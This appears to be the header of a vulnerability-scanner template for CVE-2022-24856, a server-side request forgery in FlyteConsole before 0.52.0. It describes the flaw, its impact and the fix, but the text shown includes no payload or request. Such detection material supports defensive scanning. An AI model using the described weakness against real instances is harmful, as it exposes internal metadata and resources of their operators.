id: CVE-2022-24856

info:
  name: Flyte Console <0.52.0 - Server-Side Request Forgery
  author: pdteam
  severity: high
  description: |
    FlyteConsole is the web user interface for the Flyte platform. FlyteConsole prior to version 0.52.0 is vulnerable to server-side request forgery when FlyteConsole is open to the general internet. An attacker can exploit any user of a vulnerable instance to access the internal metadata server or other unauthenticated URLs. Passing of headers to an unauthorized actor may occur.
  impact: |
    An attacker can exploit this vulnerability to perform unauthorized actions, such as accessing internal resources, bypassing security controls, or launching further attacks.
  remediation: |
    The patch for this issue deletes the entire cors_proxy, as this is no longer required for the console. A patch is available in FlyteConsole version 0.52.0, or as a work-around disable FlyteConsole.
